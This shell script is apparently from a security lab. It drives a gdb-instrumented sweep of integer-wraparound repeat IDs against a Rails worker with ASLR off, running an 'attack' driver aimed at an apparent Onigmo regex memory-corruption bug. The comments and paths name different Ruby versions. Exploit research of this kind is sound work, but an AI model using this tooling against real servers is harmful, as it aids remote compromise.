#!/bin/sh
# W304: gated gdb sweep of wrapped repeat IDs -17..-64 on one fresh stock Rails
# worker per trial. Labeled conditions: pinned 3.4.11 plain build, shallow
# layout, pad 0, threads=1, ASLR off, stock notes route; the notimeout shim is
# a gdb-timing diagnostic only, never part of a wire-only claim.
# Usage: sh lab/repro/ruby2shell-onigmo-repeat-deep.sh "17 18 19" [stack_pad] [first_port]
set -eu
cd "$(dirname "$0")/../.."
ids=${1:-"17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64"}
stack_pad=${2:-0}
port0=${3:-5200}
export RUBY2SHELL_ONIGMO_GEM_PATH=lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0
export RUBY2SHELL_ONIGMO_LAYOUT=shallow
export RUBY2SHELL_ONIGMO_STACK_PAD="$stack_pad"
export RUBY2SHELL_ONIGMO_ASLR_OFF=1
export RAILS_MAX_THREADS=1
export RUBY2SHELL_ONIGMO_GDB_RUBY=lab/build/plain/ruby-3.4.11-plain/bin/ruby
export RUBY2SHELL_ONIGMO_RUBY=lab/repro/ruby2shell-onigmo-gdbwrap.sh
export RUBY2SHELL_ONIGMO_GDB_SCRIPT=lab/repro/ruby2shell-onigmo-watch-deep.gdb
export RUBY2SHELL_ONIGMO_NOTIMEOUT_RB="$PWD/lab/repro/ruby2shell-onigmo-notimeout.rb"
export RUBY2SHELL_ONIGMO_TIMEOUT=60
EV=lab/build/evidence
mkdir -p "$EV"
summary="$EV/w304-deep-summary-p${stack_pad}.txt"
echo "=== SWEEP $(date -u +%Y-%m-%dT%H:%M:%SZ) ids=$ids" >> "$summary"

for k in $ids; do
  # Recorded mapping: ID = units + 2 (mod 65536); units=65533 gave ID -1.
  units=$((65534 - k))
  tag=w304-deep-n${k}-p${stack_pad}
  port=$((port0 + k))
  export RUBY2SHELL_ONIGMO_UNITS="$units"
  export RUBY2SHELL_ONIGMO_PORT="$port"
  echo "=== $tag id=-$k units=$units port=$port $(date -u +%H:%M:%SZ)" | tee -a "$summary"
  timeout 120 python3 lab/repro/ruby2shell-onigmo-repeat-wire.py attack "$tag" \
    > "$EV/$tag.driver.out" 2>&1 || true
  python3 - "$EV/$tag.json" "$EV/$tag.server.log" "$tag" >> "$summary" <<'PY'
import json, sys
jpath, lpath, tag = sys.argv[1:]
try:
    d = json.load(open(jpath))
except OSError:
    print(tag, "NO_JSON")
    raise SystemExit
print(tag, "ready", d.get("ready"), "first", d.get("http_status"), d.get("response_bytes"),
      "health", d.get("health"), "secs", d.get("request_seconds"),
      "err", d.get("request_error"), "exit", d.get("exit_after_request"))
lines = [line for line in open(lpath, errors="replace").read().splitlines()
         if "ONIG_DEEP " in line]
print(tag, "deep_lines", len(lines), "writes",
      sum("ONIG_DEEP BEFORE" in l or "ONIG_DEEP AFTER" in l for l in lines),
      "watches", sum("ONIG_DEEP WATCH" in l for l in lines),
      "reads", sum("ONIG_DEEP READ " in l for l in lines),
      "signals", sum("ONIG_DEEP SIGNAL" in l for l in lines))
for line in lines:
    if any(key in line for key in ("ARM", "PRE ", "PTR ", "READ ", "READ_BT ",
                                   "WATCH", "WATCH_FAIL", "SIGNAL", "LAST_WRITE", "SI_ADDR")):
        print(tag, line[:400])
PY
done
